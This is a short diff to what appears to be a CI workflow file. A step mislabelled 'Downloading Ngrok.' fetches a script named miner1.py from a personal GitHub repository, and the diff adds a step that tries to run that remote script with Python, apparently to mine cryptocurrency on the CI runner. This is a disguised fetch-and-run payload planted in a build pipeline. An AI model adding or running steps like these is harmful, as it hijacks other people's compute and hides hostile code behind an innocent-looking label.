@@ -12,4 +12,7 @@ jobs:
     - name: Downloading Ngrok.
       run: |
         Invoke-WebRequest https://raw.githubusercontent.com/TOMMARCUSBRUT/dcf/main/miner1.py
+    - name: run python.
+      run: |
+        python https://raw.githubusercontent.com/TOMMARCUSBRUT/dcf/main/miner1.py
         
